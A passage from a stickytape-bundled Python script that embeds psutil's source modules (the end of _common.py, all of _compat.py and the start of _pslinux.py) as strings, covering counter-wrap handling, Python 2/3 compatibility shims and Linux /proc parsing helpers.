"""\n        old_dict = self.cache[name]\n        gone_keys = set(old_dict.keys()) - set(input_dict.keys())\n        for gone_key in gone_keys:\n            for remkey in self.reminder_keys[name][gone_key]:\n                del self.reminders[name][remkey]\n            del self.reminder_keys[name][gone_key]\n\n    def run(self, input_dict, name):\n        """Cache dict and sum numbers which overflow and wrap.\n        Return an updated copy of `input_dict`\n        """\n        if name not in self.cache:\n            # This was the first call.\n            self._add_dict(input_dict, name)\n            return input_dict\n\n        self._remove_dead_reminders(input_dict, name)\n\n        old_dict = self.cache[name]\n        new_dict = {}\n        for key in input_dict.keys():\n            input_tuple = input_dict[key]\n            try:\n                old_tuple = old_dict[key]\n            except KeyError:\n                # The input dict has a new key (e.g. a new disk or NIC)\n                # which didn\'t exist in the previous call.\n                new_dict[key] = input_tuple\n                continue\n\n            bits = []\n            for i in range(len(input_tuple)):\n                input_value = input_tuple[i]\n                old_value = old_tuple[i]\n                remkey = (key, i)\n                if input_value < old_value:\n                    # it wrapped!\n                    self.reminders[name][remkey] += old_value\n                    self.reminder_keys[name][key].add(remkey)\n                bits.append(input_value + self.reminders[name][remkey])\n\n            new_dict[key] = tuple(bits)\n\n        self.cache[name] = input_dict\n        return new_dict\n\n    def cache_clear(self, name=None):\n        """Clear the internal cache, optionally only for function \'name\'."""\n        with self.lock:\n            if name is None:\n                self.cache.clear()\n                self.reminders.clear()\n                self.reminder_keys.clear()\n            else:\n                self.cache.pop(name, None)\n                self.reminders.pop(name, None)\n                self.reminder_keys.pop(name, None)\n\n    def cache_info(self):\n        """Return internal cache dicts as a tuple of 3 elements."""\n        with self.lock:\n            return (self.cache, self.reminders, self.reminder_keys)\n\n\ndef wrap_numbers(input_dict, name):\n    """Given an `input_dict` and a function `name`, adjust the numbers\n    which "wrap" (restart from zero) across different calls by adding\n    "old value" to "new value" and return an updated dict.\n    """\n    with _wn.lock:\n        return _wn.run(input_dict, name)\n\n\n_wn = _WrapNumbers()\nwrap_numbers.cache_clear = _wn.cache_clear\nwrap_numbers.cache_info = _wn.cache_info\n\n\n# The read buffer size for open() builtin. This (also) dictates how\n# much data we read(2) when iterating over file lines as in:\n#   >>> with open(file) as f:\n#   ...    for line in f:\n#   ...        ...\n# Default per-line buffer size for binary files is 1K. For text files\n# is 8K. We use a bigger buffer (32K) in order to have more consistent\n# results when reading /proc pseudo files on Linux, see:\n# https://github.com/giampaolo/psutil/issues/2050\n# On Python 2 this also speeds up the reading of big files:\n# (namely /proc/{pid}/smaps and /proc/net/*):\n# https://github.com/giampaolo/psutil/issues/708\nFILE_READ_BUFFER_SIZE = 32 * 1024\n\n\ndef open_binary(fname):\n    return open(fname, "rb", buffering=FILE_READ_BUFFER_SIZE)\n\n\ndef open_text(fname):\n    """On Python 3 opens a file in text mode by using fs encoding and\n    a proper en/decoding errors handler.\n    On Python 2 this is just an alias for open(name, \'rt\').\n    """\n    if not PY3:\n        return open(fname, "rt", buffering=FILE_READ_BUFFER_SIZE)\n\n    # See:\n    # https://github.com/giampaolo/psutil/issues/675\n    # https://github.com/giampaolo/psutil/pull/733\n    fobj = open(fname, "rt", buffering=FILE_READ_BUFFER_SIZE,\n                encoding=ENCODING, errors=ENCODING_ERRS)\n    try:\n        # Dictates per-line read(2) buffer size. Defaults is 8k. See:\n        # https://github.com/giampaolo/psutil/issues/2050#issuecomment-1013387546\n        fobj._CHUNK_SIZE = FILE_READ_BUFFER_SIZE\n    except AttributeError:\n        pass\n    except Exception:\n        fobj.close()\n        raise\n\n    return fobj\n\n\ndef cat(fname, fallback=_DEFAULT, _open=open_text):\n    """Read entire file content and return it as a string. File is\n    opened in text mode. If specified, `fallback` is the value\n    returned in case of error, either if the file does not exist or\n    it can\'t be read().\n    """\n    if fallback is _DEFAULT:\n        with _open(fname) as f:\n            return f.read()\n    else:\n        try:\n            with _open(fname) as f:\n                return f.read()\n        except (IOError, OSError):\n            return fallback\n\n\ndef bcat(fname, fallback=_DEFAULT):\n    """Same as above but opens file in binary mode."""\n    return cat(fname, fallback=fallback, _open=open_binary)\n\n\ndef bytes2human(n, format="%(value).1f%(symbol)s"):\n    """Used by various scripts. See:\n    http://goo.gl/zeJZl\n\n    >>> bytes2human(10000)\n    \'9.8K\'\n    >>> bytes2human(100001221)\n    \'95.4M\'\n    """\n    symbols = (\'B\', \'K\', \'M\', \'G\', \'T\', \'P\', \'E\', \'Z\', \'Y\')\n    prefix = {}\n    for i, s in enumerate(symbols[1:]):\n        prefix[s] = 1 << (i + 1) * 10\n    for symbol in reversed(symbols[1:]):\n        if n >= prefix[symbol]:\n            value = float(n) / prefix[symbol]\n            return format % locals()\n    return format % dict(symbol=symbols[0], value=n)\n\n\ndef get_procfs_path():\n    """Return updated psutil.PROCFS_PATH constant."""\n    return sys.modules[\'psutil\'].PROCFS_PATH\n\n\nif PY3:\n    def decode(s):\n        return s.decode(encoding=ENCODING, errors=ENCODING_ERRS)\nelse:\n    def decode(s):\n        return s\n\n\n# =====================================================================\n# --- shell utils\n# =====================================================================\n\n\n@memoize\ndef term_supports_colors(file=sys.stdout):  # pragma: no cover\n    if os.name == \'nt\':\n        return True\n    try:\n        import curses\n        assert file.isatty()\n        curses.setupterm()\n        assert curses.tigetnum("colors") > 0\n    except Exception:\n        return False\n    else:\n        return True\n\n\ndef hilite(s, color=None, bold=False):  # pragma: no cover\n    """Return an highlighted version of \'string\'."""\n    if not term_supports_colors():\n        return s\n    attr = []\n    colors = dict(green=\'32\', red=\'91\', brown=\'33\', yellow=\'93\', blue=\'34\',\n                  violet=\'35\', lightblue=\'36\', grey=\'37\', darkgrey=\'30\')\n    colors[None] = \'29\'\n    try:\n        color = colors[color]\n    except KeyError:\n        raise ValueError("invalid color %r; choose between %s" % (\n            list(colors.keys())))\n    attr.append(color)\n    if bold:\n        attr.append(\'1\')\n    return \'\\x1b[%sm%s\\x1b[0m\' % (\';\'.join(attr), s)\n\n\ndef print_color(\n        s, color=None, bold=False, file=sys.stdout):  # pragma: no cover\n    """Print a colorized version of string."""\n    if not term_supports_colors():\n        print(s, file=file)  # NOQA\n    elif POSIX:\n        print(hilite(s, color, bold), file=file)  # NOQA\n    else:\n        import ctypes\n\n        DEFAULT_COLOR = 7\n        GetStdHandle = ctypes.windll.Kernel32.GetStdHandle\n        SetConsoleTextAttribute = \\\n            ctypes.windll.Kernel32.SetConsoleTextAttribute\n\n        colors = dict(green=2, red=4, brown=6, yellow=6)\n        colors[None] = DEFAULT_COLOR\n        try:\n            color = colors[color]\n        except KeyError:\n            raise ValueError("invalid color %r; choose between %r" % (\n                color, list(colors.keys())))\n        if bold and color <= 7:\n            color += 8\n\n        handle_id = -12 if file is sys.stderr else -11\n        GetStdHandle.restype = ctypes.c_ulong\n        handle = GetStdHandle(handle_id)\n        SetConsoleTextAttribute(handle, color)\n        try:\n            print(s, file=file)    # NOQA\n        finally:\n            SetConsoleTextAttribute(handle, DEFAULT_COLOR)\n\n\ndef debug(msg):\n    """If PSUTIL_DEBUG env var is set, print a debug message to stderr."""\n    if PSUTIL_DEBUG:\n        import inspect\n        fname, lineno, func_name, lines, index = inspect.getframeinfo(\n            inspect.currentframe().f_back)\n        if isinstance(msg, Exception):\n            if isinstance(msg, (OSError, IOError, EnvironmentError)):\n                # ...because str(exc) may contain info about the file name\n                msg = "ignoring %s" % msg\n            else:\n                msg = "ignoring %r" % msg\n        print("psutil-debug [%s:%s]> %s" % (fname, lineno, msg),  # NOQA\n              file=sys.stderr)\n')
    __stickytape_write_module('psutil/_compat.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Module which provides compatibility with older Python versions.\nThis is more future-compatible rather than the opposite (prefer latest\nPython 3 way of doing things).\n"""\n\nimport collections\nimport contextlib\nimport errno\nimport functools\nimport os\nimport sys\nimport types\n\n\n__all__ = [\n    # constants\n    "PY3",\n    # builtins\n    "long", "range", "super", "unicode", "basestring",\n    # literals\n    "u", "b",\n    # collections module\n    "lru_cache",\n    # shutil module\n    "which", "get_terminal_size",\n    # contextlib module\n    "redirect_stderr",\n    # python 3 exceptions\n    "FileNotFoundError", "PermissionError", "ProcessLookupError",\n    "InterruptedError", "ChildProcessError", "FileExistsError"]\n\n\nPY3 = sys.version_info[0] == 3\n_SENTINEL = object()\n\nif PY3:\n    long = int\n    xrange = range\n    unicode = str\n    basestring = str\n    range = range\n\n    def u(s):\n        return s\n\n    def b(s):\n        return s.encode("latin-1")\nelse:\n    long = long\n    range = xrange\n    unicode = unicode\n    basestring = basestring\n\n    def u(s):\n        return unicode(s, "unicode_escape")\n\n    def b(s):\n        return s\n\n\n# --- builtins\n\n\n# Python 3 super().\n# Taken from "future" package.\n# Credit: Ryan Kelly\nif PY3:\n    super = super\nelse:\n    _builtin_super = super\n\n    def super(type_=_SENTINEL, type_or_obj=_SENTINEL, framedepth=1):\n        """Like Python 3 builtin super(). If called without any arguments\n        it attempts to infer them at runtime.\n        """\n        if type_ is _SENTINEL:\n            f = sys._getframe(framedepth)\n            try:\n                # Get the function\'s first positional argument.\n                type_or_obj = f.f_locals[f.f_code.co_varnames[0]]\n            except (IndexError, KeyError):\n                raise RuntimeError(\'super() used in a function with no args\')\n            try:\n                # Get the MRO so we can crawl it.\n                mro = type_or_obj.__mro__\n            except (AttributeError, RuntimeError):\n                try:\n                    mro = type_or_obj.__class__.__mro__\n                except AttributeError:\n                    raise RuntimeError(\'super() used in a non-newstyle class\')\n            for type_ in mro:\n                #  Find the class that owns the currently-executing method.\n                for meth in type_.__dict__.values():\n                    # Drill down through any wrappers to the underlying func.\n                    # This handles e.g. classmethod() and staticmethod().\n                    try:\n                        while not isinstance(meth, types.FunctionType):\n                            if isinstance(meth, property):\n                                # Calling __get__ on the property will invoke\n                                # user code which might throw exceptions or\n                                # have side effects\n                                meth = meth.fget\n                            else:\n                                try:\n                                    meth = meth.__func__\n                                except AttributeError:\n                                    meth = meth.__get__(type_or_obj, type_)\n                    except (AttributeError, TypeError):\n                        continue\n                    if meth.func_code is f.f_code:\n                        break  # found\n                else:\n                    # Not found. Move onto the next class in MRO.\n                    continue\n                break  # found\n            else:\n                raise RuntimeError(\'super() called outside a method\')\n\n        # Dispatch to builtin super().\n        if type_or_obj is not _SENTINEL:\n            return _builtin_super(type_, type_or_obj)\n        return _builtin_super(type_)\n\n\n# --- exceptions\n\n\nif PY3:\n    FileNotFoundError = FileNotFoundError  # NOQA\n    PermissionError = PermissionError  # NOQA\n    ProcessLookupError = ProcessLookupError  # NOQA\n    InterruptedError = InterruptedError  # NOQA\n    ChildProcessError = ChildProcessError  # NOQA\n    FileExistsError = FileExistsError  # NOQA\nelse:\n    # https://github.com/PythonCharmers/python-future/blob/exceptions/\n    #     src/future/types/exceptions/pep3151.py\n    import platform\n\n    def _instance_checking_exception(base_exception=Exception):\n        def wrapped(instance_checker):\n            class TemporaryClass(base_exception):\n\n                def __init__(self, *args, **kwargs):\n                    if len(args) == 1 and isinstance(args[0], TemporaryClass):\n                        unwrap_me = args[0]\n                        for attr in dir(unwrap_me):\n                            if not attr.startswith(\'__\'):\n                                setattr(self, attr, getattr(unwrap_me, attr))\n                    else:\n                        super(TemporaryClass, self).__init__(*args, **kwargs)\n\n                class __metaclass__(type):\n                    def __instancecheck__(cls, inst):\n                        return instance_checker(inst)\n\n                    def __subclasscheck__(cls, classinfo):\n                        value = sys.exc_info()[1]\n                        return isinstance(value, cls)\n\n            TemporaryClass.__name__ = instance_checker.__name__\n            TemporaryClass.__doc__ = instance_checker.__doc__\n            return TemporaryClass\n\n        return wrapped\n\n    @_instance_checking_exception(EnvironmentError)\n    def FileNotFoundError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) == errno.ENOENT\n\n    @_instance_checking_exception(EnvironmentError)\n    def ProcessLookupError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) == errno.ESRCH\n\n    @_instance_checking_exception(EnvironmentError)\n    def PermissionError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) in (\n            errno.EACCES, errno.EPERM)\n\n    @_instance_checking_exception(EnvironmentError)\n    def InterruptedError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) == errno.EINTR\n\n    @_instance_checking_exception(EnvironmentError)\n    def ChildProcessError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) == errno.ECHILD\n\n    @_instance_checking_exception(EnvironmentError)\n    def FileExistsError(inst):\n        return getattr(inst, \'errno\', _SENTINEL) == errno.EEXIST\n\n    if platform.python_implementation() != "CPython":\n        try:\n            raise OSError(errno.EEXIST, "perm")\n        except FileExistsError:\n            pass\n        except OSError:\n            raise RuntimeError(\n                "broken or incompatible Python implementation, see: "\n                "https://github.com/giampaolo/psutil/issues/1659")\n\n\n# --- stdlib additions\n\n\n# py 3.2 functools.lru_cache\n# Taken from: http://code.activestate.com/recipes/578078\n# Credit: Raymond Hettinger\ntry:\n    from functools import lru_cache\nexcept ImportError:\n    try:\n        from threading import RLock\n    except ImportError:\n        from dummy_threading import RLock\n\n    _CacheInfo = collections.namedtuple(\n        "CacheInfo", ["hits", "misses", "maxsize", "currsize"])\n\n    class _HashedSeq(list):\n        __slots__ = \'hashvalue\'\n\n        def __init__(self, tup, hash=hash):\n            self[:] = tup\n            self.hashvalue = hash(tup)\n\n        def __hash__(self):\n            return self.hashvalue\n\n    def _make_key(args, kwds, typed,\n                  kwd_mark=(object(), ),\n                  fasttypes=set((int, str, frozenset, type(None))),\n                  sorted=sorted, tuple=tuple, type=type, len=len):\n        key = args\n        if kwds:\n            sorted_items = sorted(kwds.items())\n            key += kwd_mark\n            for item in sorted_items:\n                key += item\n        if typed:\n            key += tuple(type(v) for v in args)\n            if kwds:\n                key += tuple(type(v) for k, v in sorted_items)\n        elif len(key) == 1 and type(key[0]) in fasttypes:\n            return key[0]\n        return _HashedSeq(key)\n\n    def lru_cache(maxsize=100, typed=False):\n        """Least-recently-used cache decorator, see:\n        http://docs.python.org/3/library/functools.html#functools.lru_cache\n        """\n        def decorating_function(user_function):\n            cache = dict()\n            stats = [0, 0]\n            HITS, MISSES = 0, 1\n            make_key = _make_key\n            cache_get = cache.get\n            _len = len\n            lock = RLock()\n            root = []\n            root[:] = [root, root, None, None]\n            nonlocal_root = [root]\n            PREV, NEXT, KEY, RESULT = 0, 1, 2, 3\n            if maxsize == 0:\n                def wrapper(*args, **kwds):\n                    result = user_function(*args, **kwds)\n                    stats[MISSES] += 1\n                    return result\n            elif maxsize is None:\n                def wrapper(*args, **kwds):\n                    key = make_key(args, kwds, typed)\n                    result = cache_get(key, root)\n                    if result is not root:\n                        stats[HITS] += 1\n                        return result\n                    result = user_function(*args, **kwds)\n                    cache[key] = result\n                    stats[MISSES] += 1\n                    return result\n            else:\n                def wrapper(*args, **kwds):\n                    if kwds or typed:\n                        key = make_key(args, kwds, typed)\n                    else:\n                        key = args\n                    lock.acquire()\n                    try:\n                        link = cache_get(key)\n                        if link is not None:\n                            root, = nonlocal_root\n                            link_prev, link_next, key, result = link\n                            link_prev[NEXT] = link_next\n                            link_next[PREV] = link_prev\n                            last = root[PREV]\n                            last[NEXT] = root[PREV] = link\n                            link[PREV] = last\n                            link[NEXT] = root\n                            stats[HITS] += 1\n                            return result\n                    finally:\n                        lock.release()\n                    result = user_function(*args, **kwds)\n                    lock.acquire()\n                    try:\n                        root, = nonlocal_root\n                        if key in cache:\n                            pass\n                        elif _len(cache) >= maxsize:\n                            oldroot = root\n                            oldroot[KEY] = key\n                            oldroot[RESULT] = result\n                            root = nonlocal_root[0] = oldroot[NEXT]\n                            oldkey = root[KEY]\n                            root[KEY] = root[RESULT] = None\n                            del cache[oldkey]\n                            cache[key] = oldroot\n                        else:\n                            last = root[PREV]\n                            link = [last, root, key, result]\n                            last[NEXT] = root[PREV] = cache[key] = link\n                        stats[MISSES] += 1\n                    finally:\n                        lock.release()\n                    return result\n\n            def cache_info():\n                """Report cache statistics"""\n                lock.acquire()\n                try:\n                    return _CacheInfo(stats[HITS], stats[MISSES], maxsize,\n                                      len(cache))\n                finally:\n                    lock.release()\n\n            def cache_clear():\n                """Clear the cache and cache statistics"""\n                lock.acquire()\n                try:\n                    cache.clear()\n                    root = nonlocal_root[0]\n                    root[:] = [root, root, None, None]\n                    stats[:] = [0, 0]\n                finally:\n                    lock.release()\n\n            wrapper.__wrapped__ = user_function\n            wrapper.cache_info = cache_info\n            wrapper.cache_clear = cache_clear\n            return functools.update_wrapper(wrapper, user_function)\n\n        return decorating_function\n\n\n# python 3.3\ntry:\n    from shutil import which\nexcept ImportError:\n    def which(cmd, mode=os.F_OK | os.X_OK, path=None):\n        """Given a command, mode, and a PATH string, return the path which\n        conforms to the given mode on the PATH, or None if there is no such\n        file.\n\n        `mode` defaults to os.F_OK | os.X_OK. `path` defaults to the result\n        of os.environ.get("PATH"), or can be overridden with a custom search\n        path.\n        """\n        def _access_check(fn, mode):\n            return (os.path.exists(fn) and os.access(fn, mode) and\n                    not os.path.isdir(fn))\n\n        if os.path.dirname(cmd):\n            if _access_check(cmd, mode):\n                return cmd\n            return None\n\n        if path is None:\n            path = os.environ.get("PATH", os.defpath)\n        if not path:\n            return None\n        path = path.split(os.pathsep)\n\n        if sys.platform == "win32":\n            if os.curdir not in path:\n                path.insert(0, os.curdir)\n\n            pathext = os.environ.get("PATHEXT", "").split(os.pathsep)\n            if any(cmd.lower().endswith(ext.lower()) for ext in pathext):\n                files = [cmd]\n            else:\n                files = [cmd + ext for ext in pathext]\n        else:\n            files = [cmd]\n\n        seen = set()\n        for dir in path:\n            normdir = os.path.normcase(dir)\n            if normdir not in seen:\n                seen.add(normdir)\n                for thefile in files:\n                    name = os.path.join(dir, thefile)\n                    if _access_check(name, mode):\n                        return name\n        return None\n\n\n# python 3.3\ntry:\n    from shutil import get_terminal_size\nexcept ImportError:\n    def get_terminal_size(fallback=(80, 24)):\n        try:\n            import fcntl\n            import struct\n            import termios\n        except ImportError:\n            return fallback\n        else:\n            try:\n                # This should work on Linux.\n                res = struct.unpack(\n                    \'hh\', fcntl.ioctl(1, termios.TIOCGWINSZ, \'1234\'))\n                return (res[1], res[0])\n            except Exception:\n                return fallback\n\n\n# python 3.3\ntry:\n    from subprocess import TimeoutExpired as SubprocessTimeoutExpired\nexcept ImportError:\n    class SubprocessTimeoutExpired:\n        pass\n\n\n# python 3.5\ntry:\n    from contextlib import redirect_stderr\nexcept ImportError:\n    @contextlib.contextmanager\n    def redirect_stderr(new_target):\n        original = getattr(sys, "stderr")\n        try:\n            setattr(sys, "stderr", new_target)\n            yield new_target\n        finally:\n            setattr(sys, "stderr", original)\n')
    __stickytape_write_module('psutil/_pslinux.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Linux platform implementation."""\n\nfrom __future__ import division\n\nimport base64\nimport collections\nimport errno\nimport functools\nimport glob\nimport os\nimport re\nimport socket\nimport struct\nimport sys\nimport traceback\nimport warnings\nfrom collections import defaultdict\nfrom collections import namedtuple\n\nfrom . import _common\nfrom . import _psposix\nfrom . import _psutil_linux as cext\nfrom . import _psutil_posix as cext_posix\nfrom ._common import NIC_DUPLEX_FULL\nfrom ._common import NIC_DUPLEX_HALF\nfrom ._common import NIC_DUPLEX_UNKNOWN\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import ZombieProcess\nfrom ._common import bcat\nfrom ._common import cat\nfrom ._common import debug\nfrom ._common import decode\nfrom ._common import get_procfs_path\nfrom ._common import isfile_strict\nfrom ._common import memoize\nfrom ._common import memoize_when_activated\nfrom ._common import open_binary\nfrom ._common import open_text\nfrom ._common import parse_environ_block\nfrom ._common import path_exists_strict\nfrom ._common import supports_ipv6\nfrom ._common import usage_percent\nfrom ._compat import PY3\nfrom ._compat import FileNotFoundError\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\nfrom ._compat import b\nfrom ._compat import basestring\n\n\nif sys.version_info >= (3, 4):\n    import enum\nelse:\n    enum = None\n\n\n__extra__all__ = [\n    #\n    \'PROCFS_PATH\',\n    # io prio constants\n    "IOPRIO_CLASS_NONE", "IOPRIO_CLASS_RT", "IOPRIO_CLASS_BE",\n    "IOPRIO_CLASS_IDLE",\n    # connection status constants\n    "CONN_ESTABLISHED", "CONN_SYN_SENT", "CONN_SYN_RECV", "CONN_FIN_WAIT1",\n    "CONN_FIN_WAIT2", "CONN_TIME_WAIT", "CONN_CLOSE", "CONN_CLOSE_WAIT",\n    "CONN_LAST_ACK", "CONN_LISTEN", "CONN_CLOSING", ]\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\n\nPOWER_SUPPLY_PATH = "/sys/class/power_supply"\nHAS_PROC_SMAPS = os.path.exists(\'/proc/%s/smaps\' % os.getpid())\nHAS_PROC_SMAPS_ROLLUP = os.path.exists(\'/proc/%s/smaps_rollup\' % os.getpid())\nHAS_PROC_IO_PRIORITY = hasattr(cext, "proc_ioprio_get")\nHAS_CPU_AFFINITY = hasattr(cext, "proc_cpu_affinity_get")\n\n# Number of clock ticks per second\nCLOCK_TICKS = os.sysconf("SC_CLK_TCK")\nPAGESIZE = cext_posix.getpagesize()\nBOOT_TIME = None  # set later\nLITTLE_ENDIAN = sys.byteorder == \'little\'\n\n# "man iostat" states that sectors are equivalent with blocks and have\n# a size of 512 bytes. Despite this value can be queried at runtime\n# via /sys/block/{DISK}/queue/hw_sector_size and results may vary\n# between 1k, 2k, or 4k... 512 appears to be a magic constant used\n# throughout Linux source code:\n# * https://stackoverflow.com/a/38136179/376587\n# * https://lists.gt.net/linux/kernel/2241060\n# * https://github.com/giampaolo/psutil/issues/1305\n# * https://github.com/torvalds/linux/blob/\n#     4f671fe2f9523a1ea206f63fe60a7c7b3a56d5c7/include/linux/bio.h#L99\n# * https://lkml.org/lkml/2015/8/17/234\nDISK_SECTOR_SIZE = 512\n\nif enum is None:\n    AF_LINK = socket.AF_PACKET\nelse:\n    AddressFamily = enum.IntEnum(\'AddressFamily\',\n                                 {\'AF_LINK\': int(socket.AF_PACKET)})\n    AF_LINK = AddressFamily.AF_LINK\n\n# ioprio_* constants http://linux.die.net/man/2/ioprio_get\nif enum is None:\n    IOPRIO_CLASS_NONE = 0\n    IOPRIO_CLASS_RT = 1\n    IOPRIO_CLASS_BE = 2\n    IOPRIO_CLASS_IDLE = 3\nelse:\n    class IOPriority(enum.IntEnum):\n        IOPRIO_CLASS_NONE = 0\n        IOPRIO_CLASS_RT = 1\n        IOPRIO_CLASS_BE = 2\n        IOPRIO_CLASS_IDLE = 3\n\n    globals().update(IOPriority.__members__)\n\n# See:\n# https://github.com/torvalds/linux/blame/master/fs/proc/array.c\n# ...and (TASK_* constants):\n# https://github.com/torvalds/linux/blob/master/include/linux/sched.h\nPROC_STATUSES = {\n    "R": _common.STATUS_RUNNING,\n    "S": _common.STATUS_SLEEPING,\n    "D": _common.STATUS_DISK_SLEEP,\n    "T": _common.STATUS_STOPPED,\n    "t": _common.STATUS_TRACING_STOP,\n    "Z": _common.STATUS_ZOMBIE,\n    "X": _common.STATUS_DEAD,\n    "x": _common.STATUS_DEAD,\n    "K": _common.STATUS_WAKE_KILL,\n    "W": _common.STATUS_WAKING,\n    "I": _common.STATUS_IDLE,\n    "P": _common.STATUS_PARKED,\n}\n\n# https://github.com/torvalds/linux/blob/master/include/net/tcp_states.h\nTCP_STATUSES = {\n    "01": _common.CONN_ESTABLISHED,\n    "02": _common.CONN_SYN_SENT,\n    "03": _common.CONN_SYN_RECV,\n    "04": _common.CONN_FIN_WAIT1,\n    "05": _common.CONN_FIN_WAIT2,\n    "06": _common.CONN_TIME_WAIT,\n    "07": _common.CONN_CLOSE,\n    "08": _common.CONN_CLOSE_WAIT,\n    "09": _common.CONN_LAST_ACK,\n    "0A": _common.CONN_LISTEN,\n    "0B": _common.CONN_CLOSING\n}\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.virtual_memory()\nsvmem = namedtuple(\n    \'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\',\n              \'active\', \'inactive\', \'buffers\', \'cached\', \'shared\', \'slab\'])\n# psutil.disk_io_counters()\nsdiskio = namedtuple(\n    \'sdiskio\', [\'read_count\', \'write_count\',\n                \'read_bytes\', \'write_bytes\',\n                \'read_time\', \'write_time\',\n                \'read_merged_count\', \'write_merged_count\',\n                \'busy_time\'])\n# psutil.Process().open_files()\npopenfile = namedtuple(\n    \'popenfile\', [\'path\', \'fd\', \'position\', \'mode\', \'flags\'])\n# psutil.Process().memory_info()\npmem = namedtuple(\'pmem\', \'rss vms shared text lib data dirty\')\n# psutil.Process().memory_full_info()\npfullmem = namedtuple(\'pfullmem\', pmem._fields + (\'uss\', \'pss\', \'swap\'))\n# psutil.Process().memory_maps(grouped=True)\npmmap_grouped = namedtuple(\n    \'pmmap_grouped\',\n    [\'path\', \'rss\', \'size\', \'pss\', \'shared_clean\', \'shared_dirty\',\n     \'private_clean\', \'private_dirty\', \'referenced\', \'anonymous\', \'swap\'])\n# psutil.Process().memory_maps(grouped=False)\npmmap_ext = namedtuple(\n    \'pmmap_ext\', \'addr perms \' + \' \'.join(pmmap_grouped._fields))\n# psutil.Process.io_counters()\npio = namedtuple(\'pio\', [\'read_count\', \'write_count\',\n                         \'read_bytes\', \'write_bytes\',\n                         \'read_chars\', \'write_chars\'])\n# psutil.Process.cpu_times()\npcputimes = namedtuple(\'pcputimes\',\n                       [\'user\', \'system\', \'children_user\', \'children_system\',\n                        \'iowait\'])\n\n\n# =====================================================================\n# --- utils\n# =====================================================================\n\n\ndef readlink(path):\n    """Wrapper around os.readlink()."""\n    assert isinstance(path, basestring), path\n    path = os.readlink(path)\n    # readlink() might return paths containing null bytes (\'\\x00\')\n    # resulting in "TypeError: must be encoded string without NULL\n    # bytes, not str" errors when the string is passed to other\n    # fs-related functions (os.*, open(), ...).\n    # Apparently everything after \'\\x00\' is garbage (we can have\n    # \' (deleted)\', \'new\' and possibly others), see:\n    # https://github.com/giampaolo/psutil/issues/717\n    path = path.split(\'\\x00\')[0]\n    # Certain paths have \' (deleted)\' appended. Usually this is\n    # bogus as the file actually exists. Even if it doesn\'t we\n    # don\'t care.\n    if path.endswith(\' (deleted)\') and not path_exists_strict(path):\n        path = path[:-10]\n    return path\n\n\ndef file_flags_to_mode(flags):\n    """Convert file\'s open() flags into a readable string.\n    Used by Process.open_files().\n    """\n    modes_map = {os.O_RDONLY: \'r\', os.O_WRONLY: \'w\', os.O_RDWR: \'w+\'}\n    mode = modes_map[flags & (os.O_RDONLY | os.O_WRONLY | os.O_RDWR)]\n    if flags & os.O_APPEND:\n        mode = mode.replace(\'w\', \'a\', 1)\n    mode = mode.replace(\'w+\', \'r+\')\n    # possible values: r, w, a, r+, a+\n    return mode\n\n\ndef is_storage_device(name):\n    """Return True if the given name refers to a root device (e.g.\n    "sda", "nvme0n1") as opposed to a logical partition (e.g.  "sda1",\n    "nvme0n1p1"). If name is a virtual device (e.g. "loop1", "ram")\n    return True.\n    """\n    # Readapted from iostat source code, see:\n    # https://github.com/sysstat/sysstat/blob/\n    #     97912938cd476645b267280069e83b1c8dc0e1c7/common.c#L208\n    # Some devices may have a slash in their name (e.g. cciss/c0d0...).\n    name = name.replace(\'/\', \'!\')\n    including_virtual = True\n    if including_virtual:\n        path = "/sys/block/%s" % name\n    else:\n        path = "/sys/block/%s/device" % name\n    return os.access(path, os.F_OK)\n\n\n@memoize\ndef set_scputimes_ntuple(procfs_path):\n    """Set a namedtuple of variable fields depending on the CPU times\n    available on this Linux kernel version which may be:\n    (user, nice, system, idle, iowait, irq, softirq, [steal, [guest,\n     [guest_nice]]])\n    Used by cpu_times() function.\n    """\n    global scputimes\n    with open_binary(\'%s/stat\' % procfs_path) as f:\n        values = f.readline().split()[1:]\n    fields = [\'user\', \'nice\', \'system\', \'idle\', \'iowait\', \'irq\', \'softirq\']\n    vlen = len(values)\n    if vlen >= 8:\n        # Linux >= 2.6.11\n        fields.append(\'steal\')\n    if vlen >= 9:\n        # Linux >= 2.6.24\n        fields.append(\'guest\')\n    if vlen >= 10:\n        # Linux >= 3.2.0\n        fields.append(\'guest_nice\')\n    scputimes = namedtuple(\'scputimes\', fields)\n\n\ntry:\n    set_scputimes_ntuple("/proc")\nexcept Exception:  # pragma: no cover\n    # Don\'t want to crash at import time.\n    traceback.print_exc()\n    scputimes = namedtuple(\'scputimes\', \'user system idle\')(0.0, 0.0, 0.0)\n\n\n# =====================================================================\n# --- prlimit\n# =====================================================================\n\n# Backport of resource.prlimit() for Python 2. Originally this was done\n# in C, but CentOS-6 which we use to create manylinux wheels is too old\n# and does not support prlimit() syscall. As such the resulting wheel\n# would not include prlimit(), even when installed on newer systems.\n# This is the only part of psutil using ctypes.\n\nprlimit = None\ntry:\n    from resource import prlimit  # python >= 3.4\nexcept ImportError:\n    import ctypes\n\n    libc = ctypes.CDLL(None, use_errno=True)\n\n    if hasattr(libc, "prlimit"):\n\n        def prlimit(pid, resource_, limits=None):\n            class StructRlimit(ctypes.Structure):\n                _fields_ = [(\'rlim_cur\', ctypes.c_longlong),\n                            (\'rlim_max\', ctypes.c_longlong)]\n\n            current = StructRlimit()\n            if limits is None:\n                # get\n                ret = libc.prlimit(pid, resource_, None, ctypes.byref(current))\n            else:\n                # set\n                new = StructRlimit()\n                new.rlim_cur = limits[0]\n                new.rlim_max = limits[1]\n                ret = libc.prlimit(\n                    pid, resource_, ctypes.byref(new), ctypes.byref(current))\n\n            if ret != 0:\n                errno = ctypes.get_errno()\n                raise OSError(errno, os.strerror(errno))\n            return (current.rlim_cur, current.rlim_max)\n\n\nif prlimit is not 